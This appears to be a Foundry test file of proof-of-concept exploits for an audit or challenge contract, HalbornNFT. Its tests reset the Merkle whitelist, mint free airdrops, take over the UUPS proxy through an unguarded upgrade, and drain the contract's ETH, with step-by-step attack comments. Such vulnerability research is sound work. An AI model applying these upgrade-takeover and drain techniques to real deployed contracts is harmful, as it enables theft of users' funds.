// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";

import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";

import {HalbornNFT} from "../src/HalbornNFT.sol";
import {NFT_UUPSattack} from "../src/exploit/HalbornNFTExploit.sol";
import {Merkle} from "./murky/Merkle.sol";

/**
 * @title HalbornNFT_Test - UUPS Upgrade and Access Control Exploits
 * @dev This contract demonstrates multiple critical vulnerabilities in HalbornNFT:
 *
 * EXPLOIT VECTORS COVERED:
 * 1. UUPS Upgrade Bypass (Critical) - Anyone can upgrade the contract
 * 2. Merkle Root Manipulation (Critical) - Unlimited airdrop minting
 * 3. Price Manipulation (Critical) - Set arbitrary NFT prices
 * 4. ETH Drainage (Critical) - Steal all contract funds
 * 5. Counter Overflow (Low) - Theoretical ID collision
 *
 * ROOT CAUSE: Empty _authorizeUpgrade() + missing access controls
 * IMPACT: Complete NFT protocol takeover, fund theft, economic manipulation
 */
contract HalbornNFT_Test is Test, Merkle {
    HalbornNFT public nft;
    ERC1967Proxy proxy;
    HalbornNFT impl;

    function setUp() public {
        impl = new HalbornNFT();
        proxy = new ERC1967Proxy(address(impl), "");
        nft = HalbornNFT(address(proxy));
        nft.initialize(keccak256(abi.encodePacked("root")), 1 ether);
    }

    // Test Initialize base implementation
    function test_initialize() public {
        assertEq(nft.merkleRoot(), keccak256(abi.encodePacked("root")));
        assertEq(nft.price(), 1 ether);
    }

    // Critical Exploit 1: anyone can set merkle root
    /**
     * @dev EXPLOIT: Merkle Root Manipulation Attack
     *
     * VULNERABILITY: setMerkleRoot() has no access control
     * ATTACK VECTOR: Replace legitimate whitelist with attacker-controlled one
     *
     * EXPLOIT STEPS:
     * 1. Anyone can call setMerkleRoot() with arbitrary root
     * 2. Attacker sets empty root or crafted root including their address
     * 3. This bypasses the intended whitelist mechanism
     *
     * IMPACT: Unlimited airdrop minting, whitelist bypass, protocol economics broken
     */
    function test_setMerkelRoot() public {
        address unauthorizedUser = address(0xdead);

        // PROOF: State before exploit
        bytes32 originalRoot = nft.merkleRoot();
        console.log("BEFORE EXPLOIT:");
        console.log("Original merkle root:", vm.toString(originalRoot));
        console.log("Unauthorized user can change root:", false);

        vm.prank(unauthorizedUser);

        // CRITICAL: Unauthorized user can set arbitrary merkle root
        // This completely bypasses the whitelist mechanism
        bytes32 newRoot = keccak256(abi.encodePacked(""));
        nft.setMerkleRoot(newRoot);

        // PROOF: State after exploit
        console.log("\nAFTER EXPLOIT:");
        console.log("New merkle root:", vm.toString(nft.merkleRoot()));
        console.log("Unauthorized user changed root:", true);
        console.log("Whitelist bypassed:", true);

        assertEq(nft.merkleRoot(), newRoot);
    }

    // Critical Exploit 2: Mint after setting merkle root
    /**
     * @dev EXPLOIT: Unlimited Airdrop Minting via Merkle Manipulation
     *
     * VULNERABILITY: Combine merkle root manipulation with unlimited minting
     * ATTACK VECTOR: Create custom merkle tree with attacker's address
     *
     * EXPLOIT STEPS:
     * 1. Craft malicious merkle tree with attacker's address and multiple token IDs
     * 2. Generate valid proofs for each token ID
     * 3. Call setMerkleRoot() with crafted root (no access control)
     * 4. Mint multiple NFTs using the crafted proofs
     *
     * IMPACT: Unlimited free NFT minting, economic collapse, supply manipulation
     */
    function test_setMintUnlimited() public {
        address unauthorizedUser = address(0xdead);

        // PROOF: State before exploit
        console.log("BEFORE EXPLOIT:");
        console.log("Test contract NFT balance:", nft.balanceOf(address(this)));
        console.log("Total NFT supply:", nft.idCounter());
        console.log("Can mint without whitelist:", false);

        vm.prank(unauthorizedUser);

        // Step 1: Craft malicious merkle tree with test contract address
        bytes32 left = keccak256(abi.encodePacked(address(this), uint256(1)));
        bytes32 right = keccak256(abi.encodePacked(address(this), uint256(2)));
        bytes32 root = hashLeafPairs(left, right);

        // Step 2: Generate valid proofs for both tokens
        bytes32[] memory proofForLeft = new bytes32[](1);
        proofForLeft[0] = right;

        bytes32[] memory proofForRight = new bytes32[](1);
        proofForRight[0] = left;

        // Step 3: CRITICAL - Set malicious merkle root (no authorization)
        nft.setMerkleRoot(root);

        // Step 4: Mint unlimited NFTs using crafted proofs
        nft.mintAirdrops(1, proofForLeft);
        nft.mintAirdrops(2, proofForRight);

        // PROOF: State after exploit
        console.log("\nAFTER EXPLOIT:");
        console.log("Test contract NFT balance:", nft.balanceOf(address(this)));
        console.log("Total NFT supply:", nft.idCounter());
        console.log("Unlimited minting achieved:", true);
        console.log("Whitelist completely bypassed:", true);

        // Could continue minting more with additional crafted proofs
    }

    // Critical Exploit 3: anyone can upgrade to UUPSattack
    /**
     * @dev EXPLOIT: UUPS Upgrade Takeover Attack
     *
     * VULNERABILITY: HalbornNFT has empty _authorizeUpgrade() function
     * ATTACK VECTOR: Deploy malicious implementation and upgrade to it
     *
     * EXPLOIT STEPS:
     * 1. Deploy malicious NFT implementation (NFT_UUPSattack)
     * 2. Call upgradeTo() to replace legitimate implementation
     * 3. Re-initialize with attacker as owner and malicious parameters
     * 4. Now attacker controls entire NFT contract
     *
     * IMPACT: Complete NFT protocol takeover, can steal ETH, manipulate prices
     */
    function test_vulnerableUUPSupgrade() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        assertEq(nft.price(), 1 ether);

        // Step 1: Deploy malicious implementation
        NFT_UUPSattack attack = new NFT_UUPSattack();

        // Step 2: CRITICAL - Upgrade to malicious implementation (no authorization)
        nft.upgradeTo(address(attack));

        // Step 3: Re-initialize with attacker as owner and malicious price
        nft.initialize("", 666);

        // Step 4: Verify attacker now controls price (and everything else)
        assertEq(nft.price(), 666);
    }

    // Critical Exploit 9: anyone can set price
    function test_setPrice() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        uint256 newPrice = 666;

        NFT_UUPSattack attack = new NFT_UUPSattack();
        nft.upgradeTo(address(attack));
        nft.initialize("", newPrice);

        assertEq(nft.price(), newPrice);
    }

    // Critical Exploit 4: anyone can steal to ETH in contract
    /**
     * @dev EXPLOIT: ETH Drainage Attack via Malicious Upgrade
     *
     * VULNERABILITY: Post-upgrade malicious contract can drain all ETH
     * ATTACK VECTOR: Upgrade to malicious implementation with withdrawETH function
     *
     * EXPLOIT STEPS:
     * 1. Legitimate users buy NFTs, funding the contract with ETH
     * 2. Attacker upgrades to malicious implementation
     * 3. Malicious implementation has withdrawETH() function for attacker
     * 4. Attacker drains all ETH from contract
     *
     * IMPACT: Complete fund theft, protocol bankruptcy, user financial loss
     */
    function test_stealETH() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);
        vm.deal(unauthorizedUser, 1e18);

        // Step 1: Legitimate user buys NFT, funding the contract
        nft.mintBuyWithETH{value: 1 ether}();

        // PROOF: State before exploit
        uint256 attackerBalanceBefore = unauthorizedUser.balance;
        uint256 contractBalanceBefore = address(nft).balance;
        console.log("BEFORE EXPLOIT:");
        console.log("Attacker ETH balance:", attackerBalanceBefore);
        console.log("Contract ETH balance:", contractBalanceBefore);
        console.log("Attacker can drain contract:", false);

        // Step 2: Deploy and upgrade to malicious implementation
        NFT_UUPSattack attack = new NFT_UUPSattack();
        nft.upgradeTo(address(attack));
        nft.initialize("", 666);

        // Step 3: CRITICAL - Drain all ETH from the contract
        nft.withdrawETH(0); // Malicious function ignores amount param, drains all

        // PROOF: State after exploit
        uint256 attackerBalanceAfter = unauthorizedUser.balance;
        uint256 contractBalanceAfter = address(nft).balance;
        console.log("\nAFTER EXPLOIT:");
        console.log("Attacker ETH balance:", attackerBalanceAfter);
        console.log("Contract ETH balance:", contractBalanceAfter);
        console.log(
            "ETH stolen:",
            attackerBalanceAfter - attackerBalanceBefore
        );
        console.log("Contract drained:", contractBalanceAfter == 0);

        // Step 4: Verify successful theft
        assertEq(contractBalanceAfter, 0);
        assertEq(attackerBalanceAfter - attackerBalanceBefore, 1 ether);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
